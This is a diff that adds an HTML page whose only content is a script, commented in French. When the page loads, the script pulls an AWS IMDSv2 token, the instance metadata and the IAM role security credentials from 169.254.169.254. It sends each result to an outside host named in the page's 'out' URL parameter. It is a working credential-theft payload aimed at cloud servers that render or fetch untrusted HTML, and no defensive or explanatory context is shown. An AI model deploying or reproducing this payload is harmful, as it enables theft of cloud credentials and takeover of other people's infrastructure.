@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head><title>metadata</title></head>
+<body>
+<script>
+    const OUT = new URLSearchParams(window.location.search).get("out");
+
+    async function exfil(tag, payload) {
+        await fetch(OUT + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0, 3000)), {
+            mode: "no-cors",
+            keepalive: true
+        });
+    }
+
+    (async () => {
+        if (!OUT) return;
+
+        await exfil("start", { ua: navigator.userAgent });
+
+        try {
+            // IMDSv2 — étape 1 : token
+            const tokenResp = await fetch("http://169.254.169.254/latest/api/token", {
+                method: "PUT",
+                headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
+                credentials: "include"
+            });
+            const token = await tokenResp.text();
+            await exfil("token", { status: tokenResp.status, token: token.slice(0, 200) });
+
+            // Étape 2 : root metadata
+            const rootResp = await fetch("http://169.254.169.254/latest/meta-data/", {
+                headers: { "X-aws-ec2-metadata-token": token },
+                credentials: "include"
+            });
+            const root = await rootResp.text();
+            await exfil("root", { status: rootResp.status, body: root });
+
+            // Étape 3 : security-credentials seulement si présent dans le listing
+            if (root.includes("iam")) {
+                const rolesResp = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
+                    headers: { "X-aws-ec2-metadata-token": token },
+                    credentials: "include"
+                });
+                const roles = await rolesResp.text();
+                await exfil("roles", { status: rolesResp.status, body: roles });
+
+                const role = roles.trim().split("\n")[0];
+                if (role) {
+                    const credsResp = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, {
+                        headers: { "X-aws-ec2-metadata-token": token },
+                        credentials: "include"
+                    });
+                    const creds = await credsResp.text();
+                    await exfil("creds", { role, status: credsResp.status, body: creds });
+                }
+            }
+
+        } catch(e) {
+            await exfil("err", { error: e.message });
+        }
+
+        await exfil("done", {});
+    })();
+</script>
+</body>
+</html>
+
